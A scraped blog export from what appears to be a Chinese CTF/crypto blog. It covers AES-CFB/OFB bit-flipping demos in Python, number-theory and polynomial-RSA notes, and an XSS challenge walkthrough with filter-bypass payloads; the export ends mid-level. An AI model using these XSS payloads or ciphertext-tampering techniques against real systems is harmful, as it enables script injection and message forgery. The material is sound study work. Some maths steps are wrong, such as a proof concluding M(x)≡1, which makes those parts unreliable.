先来看一下CFB的加解密模式吧，图片选自wikipedia： 那么按道理说，我们如果将密文的第一块反转，那么明文的第一块也应该被对应篡改，但事实并非如此，我们看这个测试demo from Crypto.Cipher import AES from os import urandom from Crypto.Util.strxor import strxor class AES_CFB: def __init__(self): self.key = urandom(16) self.iv = urandom(16) def encrypt(self, plain): aes = AES.new(self.key, AES.MODE_CFB, self.iv) return aes.encrypt(plain) def decrypt(self, cipher): aes = AES.new(self.key, AES.MODE_CFB, self.iv) return aes.decrypt(cipher) plain = '1'*32 aes = AES_CFB() cipher = aes.encrypt(plain) print aes.decrypt(cipher) ct = strxor(strxor(cipher[:16], '1'*16), '2'*16)+cipher[16:] print aes.decrypt(ct) 运行结果如下： 一片乱码？但是如果你仔细观察的话，会发现其实第一个字符已经被改成了2，那为什么后面的都是乱码呢？ 我们修改一下代码，只更改第一个字符： ct = strxor(strxor(cipher[:1], '1'*1), '2'*1)+cipher[1:] 程序运行结果如下： 第一个字符依然是2，但是为什么后面有15个字符没有被篡改呢？ 其实，wikipedia的图并不能很好的展示CFB的工作模式 ，真实的CFB模式是这样的： 图中的Shift register代表的是移位寄存器，图中的s一般代表的是8bit也就是1字节，同时，如果我们更改了Ci，那么Ci是要被存放到下一个移位寄存器里的，并且这个Ci会一直保存在寄存器里，直到它慢慢从寄存器移出去，所以这个Ci会影响128&#x2F;8&#x3D;16个字节的明文，故最后有32-1-16&#x3D;15个字节的明文没有受影响，所以，CFB模式也是有字节反转攻击的，只是我们每次只能改动一个字节，完整的攻击demo如下： from Crypto.Cipher import AES from os import urandom from Crypto.Util.strxor import strxor class AES_CFB: def __init__(self): self.key = urandom(16) self.iv = urandom(16) def encrypt(self, plain): aes = AES.new(self.key, AES.MODE_CFB, self.iv) return aes.encrypt(plain) def decrypt(self, cipher): aes = AES.new(self.key, AES.MODE_CFB, self.iv) return aes.decrypt(cipher) plain = '1'*32 aes = AES_CFB() cipher = aes.encrypt(plain) print aes.decrypt(cipher) for i in range(32): pt = aes.decrypt(cipher) cipher = cipher[:i]+strxor(strxor(cipher[i], pt[i]), '2')+cipher[i+1:] print aes.decrypt(cipher) 程序运行结果为： OFBOFB和CFB类似，也是将块密码转换为流密码的一种分组模式，加解密图示如下： 可以从解密模式发现，OFB模式和CBC模式比较相似，并且如果其中一块的密文进行了改变的话，并不会影响它后面的密文 所以类似的，OFB模式也存在字节反转攻击，同时由于流密码的性质，我们可以很简单的做到对明文任意长度字符的篡改 demo如下： from Crypto.Cipher import AES from os import urandom from Crypto.Util.strxor import strxor class AES_OFB: def __init__(self): self.key = urandom(16) self.iv = urandom(16) def encrypt(self, plain): aes = AES.new(self.key, AES.MODE_OFB, self.iv) return aes.encrypt(plain) def decrypt(self, cipher): aes = AES.new(self.key, AES.MODE_OFB, self.iv) return aes.decrypt(cipher) plain = '1'*32 aes = AES_OFB() cipher = aes.encrypt(plain) print aes.decrypt(cipher) for i in range(32): ct = strxor(strxor(cipher[:i+1], '1'*(i+1)), '2'*(i+1))+cipher[i+1:] print aes.decrypt(ct) 运行结果如下 总结虽然名字叫做”CBC字节反转攻击”，但并不是只有CBC模式才会有这种攻击手法，CFB和OFB模式都是不能抵御这种攻击的，不能认为如果不用CBC模式以后就能完全避免这种密文重放攻击了。","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://0xr1ngs.github.io/categories/Crypto/"}],"tags":[{"name":"cbc","slug":"cbc","permalink":"https://0xr1ngs.github.io/tags/cbc/"}]},{"title":"Polynomial based RSA","slug":"Polynomial-based-RSA","date":"2019-03-26T14:03:06.000Z","updated":"2023-09-21T16:49:08.571Z","comments":true,"path":"2019/03/26/Polynomial-based-RSA/","link":"","permalink":"https://0xr1ngs.github.io/2019/03/26/Polynomial-based-RSA/","excerpt":"","text":"Polynomial based RSA简介区别于普通的RSA，基于多项式的RSA将模数和明文、密文用多项式$N(x);M(x);C(x)$来替代，安全性基于对可约多项式的分解 加解密过程 选择两个不可约的多项式$P(x),;Q(x)\\in Z_p[x]$，不可约多项式的生成可以先选择一个普通的多项式，然后用Rabin的素性测试检测是否为一个不可约多项式（和整数不同，没有具体的了解，sagemath可以随机生成） 计算$N(x)&#x3D;P(x)Q(x)$ 有R &#x3D; Z_p[x]&#x2F;&lt;N(x)&gt;，计算R中和N(x)互素的多项式的数量，记为s 选择$e&lt;s$，且$gcd(e,;s)&#x3D;1$ 选择明文多项式计算${M(x)}^e;mod;N(x)&#x3D;C(x)$ 选择$ed\\equiv;1(mod;s)$，计算${C(x)}^d\\equiv M(x);(mod;N(x))$ 计算s$P(x)&#x3D;a_nx^n+a_{n-1}x^{n-1}+\\cdots+a_1x+a_0$ $Q(x)&#x3D;b_mx^m+b_{m-1}x^{m-1}+\\cdots+b_1x+b_0$ 要得到和$N(x)$互素的多项式的数量比较困难，但我们可以用R中多项式的数量减去和$N(x)$不互素的多项式的数量，由于$N(x)&#x3D;P(x)Q(x)$所以和它不互素的多项式只有可能是$P(x)$的倍数或者$Q(x)$的倍数 $P(x)$的倍数一共有$p^m$，因为和它相乘的多项式可以表示为$k_{m-1}x^{m-1}+k_{m-2}x^{m-2}+\\cdots+k_0$，而$k_i$又有$p$种可能，同理$Q(x)$的倍数一共有$p^n$，而R中一共有$p^{m+n}$个多项式，所以 $s&#x3D;p^{m+n}-p^{n}-p^{m}+1&#x3D;(p^m-1)(p^n-1)$ 式子加1是因为$p^m$和$p^n$个多项式中共同包含了0的情况 算法证明类似于RSA算法，实际只需要证明${M(x)}^s\\equiv1;(mod;N(x))$ 设${f_1(x),;f_2(x),\\cdots,f_s(x)}$是模$N(x)$的简化剩余系，那么${M(x)f_1(x),;M(x)f_2(x),\\cdots,M(x)f_s(x)}$也是模$N(x)$的简化剩余系 所以$\\prod M(x)f_i(x);mod;N(x)&#x3D;\\prod f_i(x)$ $\\prod M(x)f_i(x)\\equiv \\prod f_i(x)\\ (mod;N(x))$ $ M(x)\\prod f_i(x)\\equiv \\prod f_i(x)\\ (mod;N(x))$ $M(x)\\equiv1(mod;N(x))$ 安全性分析基于可约多项式分解的数学难题，具体没有研究相应算法 参考文章Polynomial based RSA","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://0xr1ngs.github.io/categories/Crypto/"}],"tags":[]},{"title":"初等数论","slug":"number_theory","date":"2019-02-02T13:31:29.000Z","updated":"2023-09-21T16:51:20.222Z","comments":true,"path":"2019/02/02/number_theory/","link":"","permalink":"https://0xr1ngs.github.io/2019/02/02/number_theory/","excerpt":"","text":"整除$\\mid$表示整除，比如$3\\mid 15$表示$15$能被$3$整除 如果$c\\mid b$并且$c\\mid a$，那么对于任意整数$s$和$t$，有$c\\mid sa\\pm tb$ 如果$a\\mid b$并且$b\\mid c$，那么$a\\mid c$ 如果$(a, b) &#x3D; 1$并且$a\\mid bc$则$a\\mid c$ 最大公约数$gcd$或者$()$表示两个数的最大公约数 $\\left( a,\\ b \\right) &#x3D;\\left( a,\\ -b \\right) &#x3D; \\left(- a,\\ b \\right) &#x3D; \\left( -a,\\ -b \\right)$ $(a,\\ b,\\ c,\\ d) &#x3D; (\\ (\\ (a,\\ b),\\ c),\\ d)$ 如果$(a,\\ c) &#x3D; 1$则$(ab, \\ c) &#x3D; (b, \\ c)$ 如果$(a, b) &#x3D; 1$并且$a\\mid bc$则$a\\mid c$ 裴蜀式$a,\\ b$是任意正整数，那么存在s和t使得 $(a, b) &#x3D; sa + tb$ 可以用拓展欧几里得算法求得$s$和$t$ 推论：如果$c\\mid b$并且$c\\mid a$，那么，$c\\mid (a, b)$ 最小公倍数$\\left [ a,\\ b \\right ]\\ &#x3D;\\ \\frac{ab}{\\left( a,\\ b \\right)}$ 如果$a\\mid m, b\\mid m$, 则$[a,\\ b]\\mid m$ $[a,\\ b,\\ c,\\ d] &#x3D; [\\ [\\ [a,\\ b],\\ c],\\ d]$ 取模 $(a + b)\\ mod\\ p &#x3D; (a\\ mod\\ p + b\\ mod\\ p) \\ mod\\ p$ $(a-b)\\ mod\\ p &#x3D; (a\\ mod\\ p-b\\ mod\\ p)\\ mod\\ p$ $(a \\times b) mod\\ p &#x3D; (a\\ mod\\ p \\times b\\ mod\\ p)\\ mod\\ p$ $a ^ b\\ mod \\ p &#x3D; (\\ (a\\ mod\\ p)^ b\\ )\\ mod\\ p$ 同余如果$a-b$是$n$的整数倍则说$a \\equiv b\\ (mod\\ n)$ 如果$a \\equiv b(mod\\ n)$ 且 $c \\equiv d(mod\\ n)$，则 $a + c \\equiv b + d (mod\\ n)$ $a - c \\equiv b - d (mod\\ n)$ $ac \\equiv bd (mod\\ n)$ 特别的，$a、b、k$为整数，如果$a ≡ b(mod\\ n)$，那么 $a + k ≡ b + k(mod\\ n)$ $ak ≡ bk(mod\\ n)$说明：乘没有条件，但除有，见下 $a ^ k ≡ b ^ k(mod\\ n)$ 如果$n$为正整数，$a、b$为整数，$ad ≡ bd(mod\\ n)$，如果$(d,\\ n) &#x3D; 1$，那么 $a ≡ b(mod\\ n)$，特别的，如果$k&gt;0$ $ak ≡ bk(mod\\ nk)$ 设$a、b$为整数，$a ≡ b(mod\\ n_i)(i &#x3D; 1,\\ 2,\\ 3,\\ …,\\ k)$ 等价于$a ≡ b(mod\\ [n_1,\\ n_2,\\ n_3,\\cdots,\\ n_k])$ $a、b$不变 剩余系完全剩余系剩余类：集合$C_{a}$叫做$mod\\ m$的$a$的剩余类，模$m$的剩余类共有$m$个，$C_{0}、C_{1}、C_{2}\\cdots C_{m}$ 完全剩余系：如果一共有$m$个整数，其中任何两个数都不在同一个剩余类中，那么称这$m$个数是$mod \\ m$的一个完全剩余系 如果$(a,\\ m) &#x3D; 1$，$b$为任意整数，$r_{0}、r_{1}、r_{2}\\cdots r_{m}$是$mod\\ m$的一个完全剩余系，那么$ar_{1}\\ +\\ b,\\ ar_{2}\\ +\\ b,\\ ar_{3}\\ +\\ b,\\ \\cdots,\\ ar_{m}\\ +\\ b$也是一个完全剩余系 简化剩余系简化剩余类：如果$mod\\ m$的一个剩余类中存在一个（即所有）与$m$互素的剩余，那么该剩余类叫做简化剩余类 简化剩余系：在$mod\\ m$的所有简化剩余类中从每个类任取一个数组成的集合叫做$mod\\ m$的一个简化剩余系 最小正简化剩余系和最小非负简化剩余系中的元素相同 欧拉函数设$m$为正整数，在$1,\\ 2,\\ 3,\\ 4,\\ \\cdots,\\ m$中与$m$互素的元素的个数为$φ(m)$，$mod\\ m$的简化剩余系的元素个数即为$φ(m)$ 设$m、n$为整数，$(m, n)&#x3D;1$则$φ(mn) &#x3D; φ(m)φ(n)$ 求欧拉函数一般将他化成标准分解式，然后再进行计算 $$\\varphi(n) &#x3D; n (1-\\frac{1}{p_{1}}) (1-\\frac{1}{p_{2}}) \\cdots (1-\\frac{1}{p_{k}})$$ 如果$n &#x3D; p^k$那么$\\varphi(n) &#x3D; p^k-p^{k-1}&#x3D;(p-1)p^{k-1}$，因为除了p的倍数外，其他数都跟n互质。 逆元设$m$为正整数，$a$是满足$(a, m)&#x3D;1$的整数，则存在整数$a_{1}(1\\leqslant a_{1}&lt;m)$使得$aa_ {1}≡1(mod\\ m)$ 欧拉定理设$m$是大于$1$的整数，若整数$a$满足$(a, m)&#x3D;1$，则有 $$a^{\\varphi(m)}\\equiv1(mod \\ m)$$ 费马小定理假如$p$是质数，$a$是任意正整数$(1\\leqslant a\\leqslant p−1)$，那么 $a ^ {(p-1)}≡1（mod\\ p）$ 可以用来检验一个大数是不是素数，但是可能存在一些合数也符合上面的定理，所以需要多算几次 一般随机找到$5$个$a$都符合上面的定理，那么有很大的概率说明这是一个素数 一次同余方程计算$ax≡b(mod\\ m)$的步骤 判断$(a， m) \\mid b$是否成立，如果成立则有$(a,\\ m)$个解 计算下式的解 $$\\frac{a}{(a,\\ m)}x\\equiv 1(mod\\ \\frac{m}{(a, \\ m)})$$ 得到特解 $$x\\equiv x_{0}(mod\\ \\frac{m}{(a, \\ m)})$$ 写出通解 $$x\\equiv \\frac{b}{(a, m)}x_0+\\frac{m}{(a, \\ m)}t(mod \\ m),\\ t&#x3D;0, \\ 1,\\ \\cdots, \\ (a, \\ m)-1$$ 中国剩余定理设$n_1, \\ n_2,\\ \\cdots n_k$是两两互素的正整数，$b_1, \\ b_2$是任意整数，对于一次同余方程： $$\\left{\\begin{matrix}x \\equiv b_1(mod\\ n_1)\\x\\equiv b_2(mod\\ n_2)\\\\vdots \\x\\equiv b_k(mod\\ n_k)\\end{matrix}\\right.$$ 必有解且解数为$1$，令$N&#x3D;n_1 n_2 \\cdots n_k$，$N_i &#x3D; N&#x2F;n_i$，$i&#x3D;1, 2, \\cdots, k$ 则解为$x \\equiv N_1N_{1}^{-1}b_1+\\cdots+N_kN_{k}^{-1}b_k$(mod N) 其中$N_iN_i^{-1} \\equiv 1 (mod\\ n_i)$ 二次同余方程如果$(a, \\ m) &#x3D; 1$且同余方程$x^2\\equiv a(mod \\ m)$有解，那么$a$就叫做模$m$的平方剩余 欧拉判别定理 如果$p$为素数$(a,\\ p)&#x3D;1$，那么$a$是模$p$的平方剩余的充要条件是 $a^{\\frac{p-1}{2}} \\equiv 1(mod\\ p)$ $a$是模$p$的平方非剩余的充要条件是 $a^{\\frac{p-1}{2}} \\equiv -1(mod\\ p)$ 设$p$是素数，模$p$的平方剩余和平方非剩余的数量各为$\\frac{p-1}{2}$个并且分别与序列$1^2, \\ 2^2, \\ \\cdots, {(\\frac{p-1}{2})}^2$之一数同余，且仅与一数同余 如果$p$不是素数，也可以先用上面的序列列出来，再计算$(a, \\ p)&#x3D;1$是否成立，如果成立，就保留$a$，不成立，就舍弃这个$a$ 原根设$a,\\ m\\epsilon Z$，$m&gt;1, (a, m)&#x3D; 1$使得 $$a^e\\equiv1(mod\\ m)$$ 成立的最小正整数$e$称为$a$对模$m$的阶，记做$ord_m(a)$ 如果$e&#x3D;\\varphi (m)$，那么称$a$是模$m$的原根，又叫生成元 设$a,\\ m\\epsilon Z$，$m&gt;1, (a, m)&#x3D; 1$ ，$d$为正整数，则$a^d\\equiv 1(mod\\ m)$的充分必要条件是$ord_m(a)\\mid d$ 那么可以推出$ord_m(a)\\mid \\varphi (m)$，所以计算阶的时候只需要计算$a^d$，$d$是$\\varphi (m)$的因子 $ord_m(a^{-1}) &#x3D; ord_m(a)$ 如果$m&gt;1, (a, m)&#x3D; 1$那么 $$1&#x3D;a^0,a,a^2,\\cdots,a^{ord_m(a)-1}$$ 模$m$两两不同余，如果$a$是原根，那么上面$\\varphi(m)$个数构成模$m$的简化剩余系，这就是原根又叫做生成元的原因 设$a,\\ m, \\ d\\epsilon Z$，$m&gt;1, (a, m)&#x3D; 1$，$d\\geqslant 0$，那么 $$ord_m(a^d) &#x3D; \\frac{ord_m(a)}{(ord_m(a), \\ d)}$$ 推论，如果$m&gt;1$，$g$是原根，$d\\geqslant 1$，那么$g^d$是原根的充要条件是$(d, \\ \\varphi(m)) &#x3D; 1$ 所以如果$m$有原根，那么原根的个数为$\\varphi(\\varphi(m))$，并且如果找到了一个原根，那么就能由他找出所有的原根 原根存在的充要条件是$m&#x3D;p^a$或者$m&#x3D;2p^a$其中$a\\geqslant 1$，$p$是素数 素数的原根设$ord_p(g) &#x3D; d, \\ d&lt;p-1$，则$g^t(t&#x3D;1,\\ 2, \\ 3, \\cdots, \\ d)$都不是模$p$的原根 设$p$是素数，$\\varphi(p)$的所有不同素因数为$q_1, \\ q_2, \\ \\cdots, \\ q_k$，则$g$是模$p$的一个原根的充要条件是 $$g^{\\varphi(p)&#x2F;q_i}\\not\\equiv 1(mod\\ p), \\ i&#x3D;1, \\ 2, \\ \\cdots, \\ k$$ 离散对数设$m&gt;1$，$g$是模$m$的一个原根， $(a, \\ m) &#x3D; 1$ ，若整数$r$使得$g^r\\equiv a(mod \\ m)$成立，则$r$满足 $$r \\equiv ind_ga(mod \\ \\varphi(m))$$ 群设$G$为非空集合，在$G$内定义了一种二元运算$o$，如果满足以下公理 运算封闭性 结合公理 存在恒等元即常说的么元（乘法）或者零元（加法） 对于每个元素都存在逆元 那么$&lt;G,o&gt;$构成一个群，如果满足交换律，就称为交换群 群中任意元素$a$，有$ord_{m}(a^{-1})&#x3D;ord_{m}(a^{})$ 拉格朗日定理如果群G的非空子集合H对于G的运算也成一个群，那么H称为G的子群 设$&lt;G, o&gt;$是群，若集合$G$的元素个数有限，则其元素个数称为群$G$的阶 设H是有限群G的子群， 则H的阶整除G的阶 循环群设$&lt;G, o&gt;$是群，$a\\in G,\\ n\\in Z$，则$a$的幂定义为 $$\\begin{align*}&amp; a^n &#x3D; a\\ o \\ a \\ o\\cdots o\\ a\\&amp; a^{-n}&#x3D;a^{-1}\\ o\\ a^{-1} \\ o \\cdots \\ o \\ a^{-1}\\&amp; a^0 &#x3D; e\\\\end{align*}$$ 设$&lt;G, o&gt;$是群，$a\\in G$，则使得等式$a^k&#x3D;e$成立的最小正整数$k$称为$a$的阶，记做$\\left | a \\right | &#x3D; k$，也称$a$为$k$阶元。如果不存在这样的$k$那么称$a$是无限阶元。 设$&lt;G, o&gt;$为群，如果存在一个元素$a\\in G$，使$G&#x3D;{a^k|k\\in Z}$，则称$G$为循环群，记做$G&#x3D;$，称$a$是$G$的生成元 循环群都是交换群 设$G&#x3D;$是循环群 $(1)$ 如果$G&#x3D;$是无限循环群，则G只有两个生成元，即$a$和$a^{-1}$ $(2)$ 如果$G&#x3D;$是$n$阶循环群，那么$G$的生成元是$a^t$当且仅当$t$和$n$互素，则$n$阶循环群的生成元个数为$\\varphi (n)$ 环设$R$为非空集合，加法$(+)$与乘法$(\\cdot)$为$R$中的二元运算，若R满足： $R$对于加法是交换群 $R$对于乘法是封闭的 乘法结合律：对$\\forall a,\\ b,\\ c \\in R$，有$(a\\cdot b)\\cdot c&#x3D;a\\cdot(b\\cdot c)$ 乘法对加法的分配律：对$\\forall a, \\ b\\ ,\\ c \\in R$有 $$a\\cdot (b + c)&#x3D;a\\cdot b + a\\cdot c\\(b+c)\\cdot a &#x3D; b\\cdot a + c\\cdot a$$ 那么称$R$为一个环，如果环$R$的乘法还满足交换律，那么称其为交换环 设$a, \\ b\\in R$，且$a\\neq 0, \\ b\\neq 0$，若$a\\cdot b&#x3D;0$，则称$a$与$b$为环$R$中的零因子，交换的无零因子环称为整环 有限域设$F$为非空集合（可以是数集合，也可以是多项式集合），若在$F$中定义了加和乘两种运算，且满足下述公理： $(1)$ $F$关于加法构成交换群，其加法恒等元记为0 $(2)$ $F$中非零元全体对乘法构成交换群，其乘法恒等元记为1 $(3)$ 满足乘法对加法的分配律 那么称$F$为一个域，$F$中元素个数有限，就称$F$为有限域，以$GF(q)$或者$F_ q$表示$q$阶有限域，$q$必为素数或者素数的正整数幂 $p$阶有限域中阶为$p-1$的元素称为本原域元素，简称本原元 域上的一元多项式设$F$是一个域，$n$是非负整数，称 $$f(x) &#x3D; a_ 0+a_ 1x+a_ 2x+\\cdots+a_ nx^n,\\ a_ i\\in F$$s 是$F$中的一元多项式 如果$a_ n\\neq 0$，则称$n$是多项式$f(x)$的次数，记为$degf(x)&#x3D;n$ 如果$a_ n&#x3D;1$，则称$f(x)$为首一多项式 $F$中的全体一元多项式的集合用$F[x]$表示 通常用$F_ p[x]$表示变元为$x$，且每一项系数属于$F_ p$的所有多项式的集合 运算规则域上的一元多项式的加法和乘法运算均是域上定义的加法和乘法运算 整除对于$f(x),\\ g(x)\\in F[x],\\ g(x)\\neq0$如果存在$q(x)\\in F[x]$，使得$f(x)&#x3D;q(x)g(x)$,则称$g(x)$整除$f(x)$，记为$g(x)|f(x)$，$g(x)$称为$f(x)$的因式 $g(x)|0$ $c|g(x)$ 因为$g(x)&#x3D;c(c^{-1}g(x))$ 如果$g(x)|f(x)$，则$cg(x)|f(x)$ 如果$g(x)|f(x)$，$f(x)|h(x)$，则$g(x)|h(x)$ 如果$g(x)|f(x)$，$g(x)|h(x)$，则对任意$u(x), \\ v(x)\\in F[x]$，有$g(x)|u(x)f(x)+v(x)h(x)$ 如果$g(x)|f(x)$，$f(x)|g(x)$，则$f(x)&#x3D;cg(x)$ 公因式如果公因式$d(x)$是首一多项式，而且$f(x)、g(x)$的任何公因式都整除$d(x)$，则称$d(x)$是$f(x)、g(x)$的最大公因式，记为$(f(x), \\ g(x))$，$d(x)&#x3D;1$则称二者互素 最大公因式可以类似的用欧几里得算法求出，并且有类似的裴蜀式 不可约多项式设多项式$p(x)\\in F[x]$，且$deg\\ p(x)\\geqslant 1$，如果$p(x)$在$F[x]$内的因式仅有零次多项式及$cp(x)(c\\neq0\\in F)$，则称$p(x)$是$F[x]$内的一个不可约多项式 判断$f(x)$是否为一个不可约多项式：对所有的不可约多项式$p(x)$，$deg\\ p(x)\\leqslant \\frac {deg\\ f(x)}{2}$，都有$p(x)\\nmid f(x)$ $F_ 2[x]$上$5$次以内的不可约多项式 $1$ $x, \\ x+1$ $x^2+x+1$ $x^3+x^2+1, \\ x^3+x+1$ $x^4+x^3+x^2+x+1, \\ x^4+x^3+1, \\ x^4+x+1$ 本原多项式如果一个非零的整系数多项式$f(x) &#x3D; a_ 0+a_ 1x+a_ 2x+\\cdots+a_ nx^n,\\ a_ i\\in F$的系数互素，就称为一个本原多项式 高斯引理：本原多项式的乘积还是本原多项式 素域有限域$F$中所包含的最小子域称为$F$的素域，$F$的素域的阶称为$F$的特征。设$p$是素数，有限域$F$的阶$q&#x3D;p^n$，则$F$的素域的阶为$p$，$F$是其素域的扩域？","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://0xr1ngs.github.io/categories/Crypto/"}],"tags":[]},{"title":"XSS过关挑战","slug":"xss","date":"2018-08-21T06:02:19.000Z","updated":"2023-09-21T16:52:10.705Z","comments":true,"path":"2018/08/21/xss/","link":"","permalink":"https://0xr1ngs.github.io/2018/08/21/xss/","excerpt":"","text":"在进行haozi师傅的XSS过关挑战中学到了不少东西，参考了学长的wp，发出来总结一下 题目链接 0x00&lt;script>alert(1)&lt;/script> 最简单的 0x01&lt;/textarea>&lt;script>alert(1)&lt;/script> 闭合标签 0x02\">&lt;script>alert(1)&lt;/script>&lt;\" 原理同上 0x03&lt;script>alert`1`&lt;/script> 这道题waf了小括号 可以用反引号绕过 0x04这道题卡了好久，先来看看server code function render (input) { const stripBracketsRe = /[()`]/g input = input.replace(stripBracketsRe, '') return input } g表示全局匹配，将反引号或 (或 )替换成空浅谈XSS—字符编码和浏览器解析原理 浏览器解析的流程是先通过HTML源代码，识别HTML标签然后建立DOM树，再依据标签切换解析模式，比如 &lt;script&gt;进入JS解析器，可以解析JS编码（\\u0061），&lt;a&gt;触发HTML实体解析（&amp;#xx;） 这里不能对alert 1进行JS编码，&lt;script&gt;\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074\\\\u00601\\\\u0060&lt;/script&gt; ，因为： 在进行JavaScript解析的时候字符或者字符串仅会被解码为字符串文本或者标识符名称，在上例中Javascript解析器工作的时候将 \\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074进行解码后为 alert，而 alert是一个有效的标识符名称，它是能被正常解析的。像圆括号、双引号、单引号等等这些字符就只能被当作普通的文本，从而导致无法执行，比如 &lt;script&gt;alert(&#39;aaa\\\\u0027)&lt;/script&gt;解析后缺少闭合的单引号而无法执行成功。 &lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt; &lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt; 0x05--!>&lt;script>alert(1)&lt;/script>&lt;!-- 这道题考察了html注释符后面的感叹号可有可无 0x06先看看server code function render (input) { input = input.replace(/auto|on.*=|>/ig, '_') return `&lt;input value=1 ${input} type=\"text\">` } 这里要注意 |是或的意思，有整体分割的作用，匹配auto或者on.*&#x3D;或者&gt;而且全局匹配且不区分大小写，那么闭合标签和auto事件就不能用了然而正则里面的 .是匹配除”\\n”之外的任何单个字符，所以我们使用换行就可以绕过了 onmouseover =alert(1) 0x07server code: function render (input) { const stripTagsRe = /&lt;\\/?[^>]+>/gi input = input.replace(stripTagsRe, '') return `&lt;article>${input}&lt;/article>` } 再讲讲正则，首先匹配一个 &lt;然后 /有或者没有都可以，再去匹配除了 &gt;的任意字符一个或多个，再以 &gt;结尾这样的话可以利用浏览器的容错性，实际上如果你img标签没有闭合的话浏览器也是可以正常执行的 &lt;img src=1 onerror=alert(1) 而又由于这里的img标签又在article标签中，而且在同一行，所以需要在结尾加上一个空格或者回车浏览器才能正常执行 0x08server code: function render (src) { src = src.replace(/&lt;\\/style>/ig, '/* \\u574F\\u4EBA */') return ` &lt;style> ${src} &lt;/style> ` } 题目的想法也就是不想让你闭合style标签这里的技巧是利用在标签结尾的地方增加空格或者使用回车不影响解析 &lt;/style > &lt;script>alert(1)&lt;/script> 或者 &lt;/style > &lt;script>alert(1)&lt;/script> 0x09server code: function render (input) { let domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/ if (domainRe.test(input)) { return `&lt;script src=\"${input}\">&lt;/script>` } return 'Invalid URL' } 由于正则只匹配开头而没有匹配结尾，导致后面可以继续植入代码可以先闭合前面的双引号，在后面js标签中再用 //注释掉后面的双引号 https://www.segmentfault.com\">&lt;/script>&lt;script>alert(1)// 当然也可以用onload事件 https://www.segmentfault.com\" onload = alert(1) \" 0x0Aserver code: function render (input) { function escapeHtml(s) { return s.replace(/&amp;/g, '&amp;') .replace(/'/g, ''') .replace(/\"/g, '\"') .replace(/&lt;/g, '&lt;') .replace(/>/g, '>') .replace(/\\//g, '/') } const domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/ if (domainRe.test(input)) { return `&lt;script src=\"${escapeHtml(input)}\">&lt;/script>` } return 'Invalid URL' } 由于这道题目和上一题很像，所以我一开始想到的是闭合双引号，但是在标签的属性值里HTML对双引号编码是无效的，只会当作普通文本，所以只能另外想办法比较好的办法是去引用外部js代码，不过我倒是搜出来很多奇怪的技巧，有用@的（不知道有没有这个方法），有去新注册一个国家级域名的，不过比较好的还是就地取材：在目标url里是一个论坛网站，可以新建一个笔记，内容为 alert(1)然后点击raw功能，引入这个文件就可以了还有一个坑点在于这个替换规则没有使用 ;导致 /在编码的时候和后面的数字连在一起成了不可见字符无法识别url在浏览器里按下F12就能看到详细错误链接被识别为了 https://segmentfault.com/n%EF%BF%BD/raw解决的办法也很简单，加上 ;或者使用换行 https://www.segmentfault.com/n/;1330000016099466/raw https://www.segmentfault.com/n/ 1330000016099466/raw 0x0Bserver code: function render (input) { input = input.toUpperCase() return `&lt;h1>${input}&lt;/h1>` } 这道题的考点在于HTML的标签（包括script）不区分大小写，但是js的函数是区分的正解是用编码绕过，或者引入外部js文件一开始想的是js编码，但是很遗憾 U大写后识别不出来，只能用没有大小写区分的HTML编码 &lt;/h1>&lt;img src=1 onerror = alert(1)> &lt;script src=\"https://xss.haozi.me/j.js\">&lt;/script> 0x0Cserver code: function render (input) { input = input.replace(/[&lt;/\"']/g, '') return ` &lt;script> // alert('${input}') &lt;/script> ` } 和上面一题一样，不能用script，但是由于这里的替换只替换了一次，而且是替换字符串并且替换为空，所以可以用双写绕过 &lt;/h1>&lt;img src=1 onerror = alert(1)> &lt;scripscriptt src=\"https://xss.haozi.me/j.js\">&lt;/scripscriptt> 0x0Dserver code: function render (input) { input = input.replace(/[&lt;/\"']/g, '') return ` &lt;script> // alert('${input}') &lt;/script> ` } 首先这里双斜线只能注释单行，回车就可以绕过，还剩下的 &#39;)可以用HTML的注释符 --&gt;饶过这是一个技巧，js里面同样可以用HTML的注释符，各自用一半均有注释一行的效果，而使用 --&gt;的时候前面不能有东西，否则会语法报错 alert(1) --> 0x0Eserver code: function render (input) { input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1') input = input.toUpperCase() return '&lt;h1>' + input + '&lt;/h1>' } 这道题将返回的第一个匹配（$1）替换成 &lt;_，首先想到的当然还是编码，我想用HTML编码 img但是后来发现并不行，标签名编码没有用这道题用到的是古英语，ſ大写过后即是 S &lt;ſcript src=\"https://xss.haozi.me/j.js\">&lt;/script> 0x0Fserver code: function render (input) { function escapeHtml(s) { return s.replace(/&amp;/g, '&amp;') .replace(/'/g, ''') .replace(/\"/g, '\"') .replace(/&lt;/g, '&lt;') .replace(/>/g, '>') .replace(/\\//g, '/') } return `&lt;img src onerror=\"console.error('${escapeHtml(input)}')\">` } 这里对上述符号均进行的是HTML编码，并没有什么屌用，浏览器解析的时候会还原出来，直接闭合就好了 ');alert('1 0x10不懂这道题的意义，直接弹 1;alert(1) 0x11server cod: // from alf.nu function render (s) { function escapeJs (s) { return String(s) .replace(/\\\\/g, '\\\\\\\\') .replace(/'/g, '\\\\\\'') .replace(/\"/g, '\\\\\"') .replace(/`/g, '\\\\`') .replace(/&lt;/g, '\\\\74') .replace(/>/g, '\\\\76') .replace(/\\//g, '\\\\/') .replace(/\\n/g, '\\\\n') .replace(/\\r/g, '\\\\r') .replace(/\\t/g, '\\\\t') .replace(/\\f/g, '\\\\f') .replace(/\\v/g, '\\\\v') // .replace(/\\b/g, '\\\\b') .replace(/\\0/g, '\\\\0') } s = escapeJs(s) return ` &lt;script> var url = 'JavaScript:console.log(\"${s}\")' var a = document.createElement('a') a.href = url document.body.appendChild(a) a.click() &lt;/script> ` } 要看懂题目，这里替换的字符串里的“两个反斜线”其实是指替换成一个反斜线，因为还要起到一个转义的作用先看payload： \");alert(\"1 主要原因如下： \\本身是作为转义符号的，转义后面紧接的字符，有的字符转义会变成其他具体含义，像 \\n之类的，&quot;被转义他仍是双引号，只是在当前失去意义而已，而这里由于外面包裹的是单引号，里面的内容被认为是一个字符串，双引号本身就没有实际含义，所以这里使用 \\&quot;其实是没有用的，而在后面被拼接到href后，就会发挥双引号作用 如果截图浏览器Element选项就能看到a标签： 0x12server code: // 